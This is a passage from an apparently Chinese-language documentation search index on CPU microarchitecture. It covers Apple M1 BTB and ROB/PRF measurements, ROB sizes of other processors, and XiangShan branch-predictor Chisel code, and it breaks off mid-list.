Stride=4B\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u6240\u6709\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u5730\u5740\u200b\u4e0a\u200b\u90fd\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b\uff0c\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u6570\u91cf\u200b\u548c\u200b\u6bcf\u4e2a\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5468\u671f\u200b\u6570\u200b\u5173\u7cfb\u200b\u662f\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5728\u200b 1024 \u200b\u4e2a\u200b\u5206\u652f\u200b\u4e4b\u524d\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u505a\u5230\u200b\u6bcf\u200b\u5468\u671f\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u8bf4\u660e\u200b\u8fd9\u662f\u200b\u7b2c\u4e00\u7ea7\u200b\u7684\u200b BTB\uff0c\u200b\u5927\u5c0f\u200b\u4e3a\u200b 1024\uff1b\u200b\u4e4b\u540e\u200b\u5f88\u957f\u200b\u4e00\u6bb5\u200b\u90fd\u200b\u662f\u200b\u4e09\u200b\u5468\u671f\u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u76f4\u5230\u200b 40000+ \u200b\u624d\u200b\u5f00\u59cb\u200b\u8d85\u8fc7\u200b\u4e09\u200b\u5468\u671f\u200b\uff0c\u200b\u800c\u200b\u6b63\u597d\u200b M1 Firestorm \u200b\u7684\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b 192KB\uff0c\u200b\u6309\u200b 4B \u200b\u4e00\u4e2a\u200b\u5206\u652f\u200b\u7b97\u200b\u5c31\u662f\u200b 49152 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u57fa\u672c\u200b\u548c\u200b 40000+ \u200b\u7684\u200b\u62d0\u70b9\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bf4\u660e\u200b M1 Firestorm \u200b\u7684\u200b L1 \u200b\u6307\u4ee4\u200b\u662f\u200b\u4f5c\u4e3a\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u5b58\u5728\u200b\u7684\u200b\u3002</p> <p>\u200b\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u901a\u8fc7\u200b\u63d2\u5165\u200b NOP \u200b\u6307\u4ee4\u200b\u589e\u52a0\u200b\u5206\u652f\u200b\u7684\u200b\u95f4\u8ddd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u89c2\u5bdf\u200b\u5230\u200b\u4e0d\u540c\u200b stride \u200b\u4e0b\u200b\u62d0\u70b9\u200b\u51fa\u73b0\u200b\u4e86\u200b\u53d8\u5316\u200b\uff1a</p> <p></p> <ul> <li>stride=4B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 1024\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 49152</li> <li>stride=8B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 512\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 24576</li> <li>stride=16B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 256\uff0c\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u62d0\u70b9\u200b\u4e3a\u200b 12288</li> </ul> <p>\u200b\u8fd9\u662f\u200b\u5178\u578b\u200b\u7684\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7684\u200b\u573a\u666f\u200b\uff1a\u200b\u5047\u5982\u200b Index \u200b\u4f4d\u53d6\u200b\u7684\u200b\u662f\u200b\u5730\u5740\u200b\u7684\u200b <code>[n:2]</code> \u200b\u4f4d\u200b\uff0c\u200b\u5f53\u200b stride=8B \u200b\u65f6\u200b\uff0c\u200b\u5730\u5740\u200b\u7684\u200b <code>[2]</code> \u200b\u4f4d\u200b\u5fc5\u7136\u200b\u4e3a\u200b 0\uff0c\u200b\u6b64\u65f6\u200b Index \u200b\u53ea\u80fd\u200b\u662f\u200b\u5076\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5947\u6570\u200b Index \u200b\u7684\u200b\u9879\u200b\u5c31\u200b\u88ab\u200b\u6d6a\u8d39\u200b\u4e86\u200b\uff0c\u200b\u8868\u73b0\u200b\u51fa\u6765\u200b\u7684\u200b\u5bb9\u91cf\u200b\u53ea\u6709\u200b\u539f\u6765\u200b 1024 \u200b\u7684\u200b\u4e00\u534a\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 512\u3002\u200b\u8fdb\u4e00\u6b65\u200b\uff0cstride=16B \u200b\u65f6\u200b\uff0cIndex \u200b\u53ea\u80fd\u200b\u662f\u200b 4 \u200b\u7684\u200b\u500d\u6570\u200b\uff0c\u200b\u5bb9\u91cf\u200b\u53ea\u6709\u200b 1024 \u200b\u7684\u200b\u56db\u5206\u4e4b\u4e00\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 256\u3002</p> <p>\u200b\u4e0d\u65ad\u200b\u589e\u52a0\u200b stride\uff0cstride=1024B \u200b\u65f6\u200b\u62d0\u70b9\u200b\u4e3a\u200b 4\uff0cstride=2048B \u200b\u62d0\u70b9\u200b\u4e3a\u200b 2\uff0cstride=4096B \u200b\u62d0\u70b9\u200b\u4f9d\u7136\u200b\u4e3a\u200b 2\uff0c\u200b\u8bf4\u660e\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u662f\u200b 2 Way\uff0c\u200b\u6b64\u65f6\u200b Index \u200b\u4f4d\u6570\u200b\u53d6\u200b\u7684\u200b\u662f\u200b\u5730\u5740\u200b\u7684\u200b <code>[10:2]</code> \u200b\u4f4d\u200b\u3002</p> <p>Apple M1 Icestorm:</p> <p></p> <p>\u200b\u548c\u200b Firestorm \u200b\u7c7b\u4f3c\u200b\uff0cstride=4B \u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u5927\u5c0f\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\u4e5f\u200b\u662f\u200b 1024 \u200b\u9879\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4ece\u200b stride=8B \u200b\u65f6\u200b\u7b2c\u4e00\u4e2a\u200b\u62d0\u70b9\u200b\u524d\u200b\u63a8\u200b\uff0c\u200b\u53ef\u77e5\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u4e5f\u200b\u662f\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff1b\u200b\u7b2c\u4e8c\u7ea7\u200b BTB \u200b\u4f9d\u7136\u200b\u7531\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u63d0\u4f9b\u200b\uff0cIcestorm \u200b\u7684\u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b 128KB\uff0c\u200b\u5bf9\u5e94\u200b 32768 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5f53\u200b stride=4B \u200b\u65f6\u200b\u5373\u4f7f\u200b\u8d85\u8fc7\u200b 32768 \u200b\u4e2a\u200b\u5206\u652f\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u770b\u5230\u200b\u660e\u663e\u200b\u7684\u200b\u6027\u80fd\u200b\u4e0b\u964d\u200b\uff0c\u200b\u9884\u8ba1\u200b\u9884\u53d6\u5668\u200b\u8d77\u5230\u200b\u4e86\u200b\u4f5c\u7528\u200b\uff1b\u200b\u5f53\u200b stride=8B \u200b\u65f6\u200b\u7b2c\u4e8c\u4e2a\u200b\u62d0\u70b9\u200b\u662f\u200b 16384\uff0c\u200b\u8bf4\u660e\u200b L1 \u200b\u6307\u4ee4\u200b\u7f13\u5b58\u200b\u662f\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\u5728\u200b stride \u200b\u589e\u5927\u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u7684\u200b\u62d0\u70b9\u200b\u5e76\u200b\u4e0d\u200b\u603b\u662f\u200b\u76f8\u5e94\u200b\u9664\u4ee5\u200b 2:</p> stride size 4 1024 8 512 16 256 32 1024 64 512 128 256 256 128 512 64 1024 32 2048 16 4096 8 8192 4 16384 2 32768 2 65536 2 <p>\u200b\u76ee\u6d4b\u200b\u662f\u200b Index \u200b\u4f4d\u6570\u200b\u505a\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u54c8\u5e0c\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u76f4\u63a5\u200b\u53d6\u200b\u5730\u5740\u200b\u7684\u200b\u4f4d\u6570\u200b\uff0c\u200b\u5730\u5740\u200b\u6d89\u53ca\u200b\u4e86\u200b <code>[15:2]</code>\u3002\u200b\u7b2c\u4e00\u7ea7\u200b BTB \u200b\u662f\u200b 2 Way\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#robprf","title":"ROB/PRF \u200b\u5927\u5c0f","text":"<p>ROB \u200b\u6309\u7a0b\u5e8f\u200b\u6267\u884c\u200b\u987a\u5e8f\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u4e71\u5e8f\u6267\u884c\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u4ee5\u200b\u4fdd\u8bc1\u200b\u5f02\u5e38\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u7cbe\u786e\u200b\u6062\u590d\u200b\u3002\u200b\u6d4b\u8bd5\u200b ROB \u200b\u5927\u200b\u5c0f\u65f6\u200b\uff0c\u200b\u901a\u5e38\u200b\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e00\u7cfb\u5217\u200b pointer chasing \u200b\u7684\u200b load \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u200b\u9700\u8981\u200b\u5f88\u957f\u200b\u7684\u200b\u65f6\u95f4\u200b\u6267\u884c\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u8fd9\u4e9b\u200b load \u200b\u4e4b\u95f4\u200b\u63d2\u5165\u200b\u5f88\u591a\u200b nop \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5f53\u200b ROB \u200b\u53ef\u4ee5\u200b\u5bb9\u7eb3\u200b\u4e0b\u200b\u591a\u4e2a\u200b load \u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u6027\u80fd\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u597d\u200b\uff1b\u200b\u5f53\u200b ROB \u200b\u53ea\u80fd\u200b\u5bb9\u7eb3\u200b\u4e0b\u200b\u4e00\u4e2a\u200b load \u200b\u6307\u4ee4\u200b\u65f6\u200b\uff0c\u200b\u6027\u80fd\u200b\u4f1a\u200b\u4e0b\u964d\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u6d4b\u91cf\u200b\uff0c\u200b\u4f7f\u7528\u200b nop \u200b\u586b\u5145\u200b ROB \u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b Icestorm \u200b\u7684\u200b ROB \u200b\u5bb9\u91cf\u200b\u5728\u200b 412-415 \u200b\u5de6\u53f3\u200b\uff1a</p> <p></p> <p>\u200b\u4f46\u200b\u5728\u200b\u7f51\u4e0a\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b M1 Firestorm ROB \u200b\u5927\u5c0f\u200b\u7684\u200b\u4e0d\u540c\u200b\u7684\u200b\u5206\u6790\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b M1 Firestorm \u200b\u7684\u200b ROB \u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u4e00\u4e2a\u200b ROB \u200b\u8868\u9879\u200b\u7684\u200b\u8bbe\u8ba1\u200b\uff0c\u200b\u800c\u662f\u200b\u5141\u8bb8\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u653e\u5728\u200b\u540c\u4e00\u4e2a\u200b\u8868\u9879\u200b\u91cc\u200b\uff0c\u200b\u4f46\u200b\u53c8\u200b\u5bf9\u200b\u540c\u4e00\u4e2a\u200b\u8868\u9879\u200b\u91cc\u200b\u7684\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u9650\u5236\u200b\uff0c\u200b\u56e0\u6b64\u200b\u7528\u200b\u4e0d\u540c\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\u6d4b\u200b\u51fa\u6765\u200b\u7684\u200b ROB \u200b\u5927\u5c0f\u200b\u5c31\u200b\u4f1a\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff1a\u200b\u5927\u91cf\u200b\u7684\u200b NOP \u200b\u5927\u200b\u6982\u7387\u200b\u53ef\u4ee5\u200b\u7d27\u5bc6\u200b\u5730\u200b\u586b\u6ee1\u200b\u8868\u9879\u200b\u91cc\u200b\u7684\u200b\u591a\u6761\u200b\u6307\u4ee4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8868\u73b0\u200b\u51fa\u6765\u200b\u7684\u200b ROB \u200b\u5bb9\u91cf\u200b\u5c31\u200b\u5f88\u5927\u200b\uff1b\u200b\u5982\u679c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u51fa\u200b\u4e00\u4e2a\u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u6bcf\u6761\u200b\u6307\u4ee4\u200b\u90fd\u200b\u72ec\u5360\u200b\u4e00\u4e2a\u200b ROB \u200b\u6761\u76ee\u200b\uff0c\u200b\u90a3\u624d\u200b\u53ef\u4ee5\u200b\u6d4b\u51fa\u200b\u771f\u5b9e\u200b\u7684\u200b ROB \u200b\u5927\u5c0f\u200b\u3002</p> <p>\u200b\u628a\u200b NOP \u200b\u4fee\u6539\u200b\u6210\u200b\u6574\u6570\u200b add \u200b\u6307\u4ee4\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u62d0\u70b9\u200b\u5728\u200b 77-79 \u200b\u5de6\u53f3\u200b\uff1a</p> <p></p> <p>\u200b\u7528\u200b add \u200b\u6307\u4ee4\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u5219\u200b\u662f\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u5806\u200b\uff08Physical Register File\uff0cPRF\uff09\u200b\u7684\u200b\u5927\u5c0f\u200b\uff1a\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u547d\u540d\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u7ed9\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5206\u914d\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u540c\u65f6\u200b\u8bb0\u5f55\u200b\u4e0b\u8be5\u200b\u67b6\u6784\u200b\u5bc4\u5b58\u5668\u200b\u539f\u6765\u200b\u6620\u5c04\u200b\u7684\u200b\u65e7\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5f53\u200b\u6307\u4ee4\u200b\u4ece\u200b ROB \u200b\u4e2d\u200b\u63d0\u4ea4\u200b\u65f6\u200b\uff0c\u200b\u65e7\u200b\u7684\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u624d\u200b\u5f97\u5230\u200b\u91ca\u653e\u200b\u3002\u200b\u7531\u4e8e\u200b load \u200b\u6307\u4ee4\u200b\u5835\u585e\u200b\u4e86\u200b ROB \u200b\u7684\u200b\u63d0\u4ea4\u200b\uff0c\u200b\u5bfc\u81f4\u200b ROB \u200b\u91cc\u200b\u6709\u200b\u5927\u91cf\u200b\u7684\u200b add \u200b\u6307\u4ee4\u200b\uff0c\u200b\u6bcf\u6761\u200b add \u200b\u6307\u4ee4\u200b\u90fd\u200b\u5206\u914d\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u5e76\u4e14\u200b\u90fd\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u91ca\u653e\u200b\uff0c\u200b\u6b64\u65f6\u200b\u62d0\u70b9\u200b\u51fa\u73b0\u200b\uff0c\u200b\u8bf4\u660e\u200b\u7269\u7406\u200b\u901a\u7528\u5bc4\u5b58\u5668\u200b\u5806\u200b\u5df2\u7ecf\u200b\u6162\u200b\u4e86\u200b\uff0c\u200b\u65b0\u200b\u7684\u200b add \u200b\u6307\u4ee4\u200b\u963b\u585e\u200b\u5728\u200b\u91cd\u547d\u540d\u200b\u9636\u6bb5\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_4","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Apple Microarchitecture Research by Dougall Johnson</li> <li>Apple M1 Icestorm \u200b\u5fae\u200b\u67b6\u6784\u200b\u8bc4\u6d4b\u200b\uff08\u200b\u4e0a\u200b\uff09:\u200b\u91cd\u94f8\u200b\u5c0f\u6838\u200b\u8363\u5149\u200b</li> <li>Apple M1 Icestorm \u200b\u5fae\u200b\u67b6\u6784\u200b\uff08\u200b\u4e0b\u200b\uff09:\u200b\u91cd\u94f8\u200b\u5c0f\u6838\u200b\u8363\u5149\u200b</li> </ul>"},{"location":"hardware/cpu_microarchitecture.html#rob","title":"\u591a\u79cd\u200b\u5904\u7406\u5668\u200b\u67b6\u6784\u200b\u7684\u200b ROB \u200b\u6d4b\u8bd5","text":"<p>AMD Zen 1: \u200b\u5927\u7ea6\u200b 192 \u200b\u6761\u200b</p> <p></p> <p>AMD Zen 2: \u200b\u5927\u7ea6\u200b 224 \u200b\u6761\u200b</p> <p></p> <p>ARM Neoverse N1: \u200b\u5927\u7ea6\u200b 128 \u200b\u6761\u200b</p> <p></p> <p>Intel Broadwell: \u200b\u5927\u7ea6\u200b 192 \u200b\u6761\u200b</p> <p></p> <p>Intel Ivy Bridge EP: \u200b\u5927\u7ea6\u200b 168 \u200b\u6761\u200b</p> <p></p>"},{"location":"hardware/cpu_microarchitecture.html#_5","title":"\u591a\u79cd\u200b\u5904\u7406\u5668\u200b\u67b6\u6784\u200b\u7684\u200b\u6838\u200b\u95f4\u901a\u4fe1\u200b\u5ef6\u8fdf\u200b\u6d4b\u8bd5","text":"<p>\u200b\u6d4b\u8bd5\u5de5\u5177\u200b\uff1ahttps://github.com/clamchowder/Microbenchmarks/tree/master/CoherencyLatency</p> <p>\u200b\u6d4b\u8bd5\u200b\u7ed3\u679c\u200b\uff1a</p> <p>Apple M1:</p> <p></p> <p>Intel i9-12900KS:</p> <p></p> <p>Intel i9-14900K:</p> <p></p>"},{"location":"hardware/cpu_microarchitecture.html#_6","title":"\u9999\u5c71","text":"<p>\u200b\u6587\u6863\u200b\uff1a\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b (Branch Prediction) - XiangShan \u200b\u5b98\u65b9\u200b\u6587\u6863\u200b</p>"},{"location":"hardware/cpu_microarchitecture.html#_7","title":"\u96c1\u6816\u6e56","text":"<p>yanqihu \u200b\u7248\u672c\u200b\uff1aOpenXiangShan/XiangShan yanqihu branch</p> <p>\u200b\u9999\u5c71\u200b\u5904\u7406\u5668\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u90e8\u4ef6\u200b\u8bbe\u8ba1\u200b\u5b9e\u73b0\u200b</p> <p>FetchWidth: \u200b\u4ee5\u200b 32 bit \u200b\u4e3a\u200b\u5355\u4f4d\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u53d6\u6307\u4ee4\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u9ed8\u8ba4\u200b\u662f\u200b 8\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b ICache \u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u51fa\u200b 32 \u200b\u5b57\u8282\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b ICacheResp \u200b\u7684\u200b data \u200b\u5b57\u6bb5\u200b\u91cc\u200b\u770b\u5230\u200b\uff1a</p> <pre><code>class ICacheResp extends ICacheBundle\n{\n  val pc = UInt(VAddrBits.W)\n  val data = UInt((FetchWidth * 32).W)\n  val mmio = Bool()\n  val mask = UInt(PredictWidth.W)\n  val ipf = Bool() // page fault\n  val acf = Bool() // access fault\n}\n</code></pre> <p>\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u6709\u200b RVC \u200b\u7684\u200b\u5b58\u5728\u200b\uff0c32 \u200b\u5b57\u8282\u200b\u53ef\u80fd\u200b\u4f1a\u653e\u200b 16 \u200b\u6761\u200b\u6307\u4ee4\u200b\uff0cyanqihu \u200b\u67b6\u6784\u200b\u4f1a\u200b\u5bf9\u200b\u8fd9\u200b 16 \u200b\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u90fd\u200b\u505a\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b PredictWidth\uff0c\u200b\u5f00\u542f\u200b RVC \u200b\u65f6\u200b PredictWidth \u200b\u662f\u200b\u4e24\u500d\u200b\u7684\u200b FetchWidth \u200b\u4e5f\u200b\u5c31\u662f\u200b 16\uff0c\u200b\u4e0d\u200b\u5f00\u542f\u200b\u65f6\u200b PredictWidth \u200b\u7b49\u4e8e\u200b FetchWidth \u200b\u4e5f\u200b\u5c31\u662f\u200b 8\u3002\u200b\u4e0b\u9762\u200b\u90fd\u200b\u6309\u200b\u5f00\u542f\u200b\u4e86\u200b RVC \u200b\u6765\u200b\u8ba8\u8bba\u200b\u3002Predict Width \u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>val PredictWidth = FetchWidth * (if (HasCExtension) 2 else 1)\n</code></pre> <p>\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cMicroBTB \u200b\u8bbe\u7f6e\u200b\u4e86\u200b PredictWidth = 16 \u200b\u4e2a\u200b bank\uff0c\u200b\u6bcf\u4e2a\u200b bank \u200b\u9884\u6d4b\u200b\u5bf9\u5e94\u200b\u4f4d\u7f6e\u200b\u4e0a\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u9884\u6d4b\u200b\u5b83\u200b\uff1a</p> <ul> <li>\u200b\u662f\u4e0d\u662f\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u662f\u4e0d\u662f\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b</li> <li>\u200b\u5982\u679c\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u662f\u200b\u591a\u5c11\u200b</li> </ul> <pre><code>class ReadResp extends XSBundle\n{\n    val valid = Bool()\n    val taken = Bool()\n    val target = UInt(VAddrBits.W)\n    val is_RVC = Bool()\n    val is_Br = Bool()\n}\n</code></pre> <p>\u200b\u6bcf\u4e2a\u200b bank \u200b\u5185\u200b\u662f\u200b 16 \u200b\u4e2a\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c\u200b\u6bcf\u4e2a\u200b entry \u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ul> <li>is_Br: \u200b\u662f\u5426\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b</li> <li>is_RVC: \u200b\u662f\u5426\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b</li> <li>valid: \u200b\u662f\u5426\u200b\u5408\u6cd5\u200b</li> <li>2 bit pred: \u200b\u4e24\u4f4d\u200b\u7684\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\uff0c\u200b\u9884\u6d4b\u200b\u5206\u652f\u200b\u65b9\u5411\u200b</li> <li>20 bit tag: \u200b\u7528\u4e8e\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c\u200b\u5982\u679c\u200b FetchWidth \u200b\u662f\u200b 4\uff0c\u200b\u4e00\u6b21\u200b\u53d6\u200b 32 \u200b\u5b57\u8282\u200b\uff0c\u200b\u90a3\u4e48\u200b tag \u200b\u5c31\u662f\u200b\u820d\u5f03\u200b PC \u200b\u4f4e\u200b 5 \u200b\u4f4d\u540e\u200b\u53d6\u200b 20 \u200b\u4f4d\u200b</li> <li>20 bit lower: \u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6307\u4ee4\u200b\u5bf9\u9f50\u200b\u5230\u200b 2\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u504f\u79fb\u200b\u7684\u200b\u6700\u4f4e\u200b 1 \u200b\u4f4d\u200b</li> </ul> <p>\u200b\u4e8e\u662f\u200b MicroBTB \u200b\u7684\u200b\u8f93\u51fa\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b predict bank \u200b\u7684\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>class MicroBTBResp extends Resp\n{\n    val targets = Vec(PredictWidth, UInt(VAddrBits.W))\n    val hits = Vec(PredictWidth, Bool())\n    val takens = Vec(PredictWidth, Bool())\n    val brMask = Vec(PredictWidth, Bool())\n    val is_RVC = Vec(PredictWidth, Bool())\n}\n</code></pre> <p>\u200b\u62ff\u5230\u200b\u6bcf\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b\u6307\u4ee4\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u9884\u6d4b\u200b\u7ed3\u679c\u200b\u4ee5\u540e\u200b\uff0c\u200b\u518d\u200b\u627e\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u8df3\u8f6c\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u53d6\u5176\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f5c\u4e3a\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b fetch \u200b\u5730\u5740\u200b\u3002\u200b\u8fd9\u6837\u200b\u7684\u200b MicroBTB\uff0c\u200b\u5bf9\u4e8e\u200b 32B \u200b\u7684\u200b\u6bcf\u4e2a\u200b 2B \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b 16 \u200b\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u603b\u5171\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b 256 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u53ea\u4f1a\u200b\u51fa\u73b0\u200b\u4e00\u6b21\u200b\u3002</p> <p>MicroBTB \u200b\u7684\u200b\u9884\u6d4b\u200b\u662f\u200b Next Line Predictor\uff0c\u200b\u4e0d\u4f1a\u200b\u5f15\u5165\u200b\u989d\u5916\u200b\u7684\u200b\u6c14\u6ce1\u200b\uff0c\u200b\u4f46\u662f\u200b\u65f6\u5e8f\u200b\u6bd4\u8f83\u200b\u7d27\u5f20\u200b\uff0c\u200b\u6240\u4ee5\u200b\u505a\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd8\u6709\u200b\u66f4\u5927\u200b\u7684\u200b BTB\uff0c\u200b\u9ed8\u8ba4\u8bbe\u7f6e\u200b\u4e0b\u200b\uff0cBTB \u200b\u5927\u5c0f\u200b\u662f\u200b 2048 \u200b\u9879\u200b\uff0c2 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u53c8\u200b\u5206\u4e3a\u200b 16 \u200b\u4e2a\u200b bank\uff0c\u200b\u6298\u7b97\u200b\u4e0b\u6765\u200b\u5c31\u662f\u200b 64 \u200b\u4e2a\u200b Set\u3002BTB \u200b\u6bcf\u4e2a\u200b entry \u200b\u8bb0\u5f55\u200b\u4e86\u200b\uff1a</p> <ul> <li>isBr: \u200b\u662f\u5426\u200b\u95f4\u63a5\u200b\u8df3\u8f6c\u200b</li> <li>isRVC: \u200b\u662f\u5426\u200b\u538b\u7f29\u200b\u6307\u4ee4\u200b</li> <li>valid: 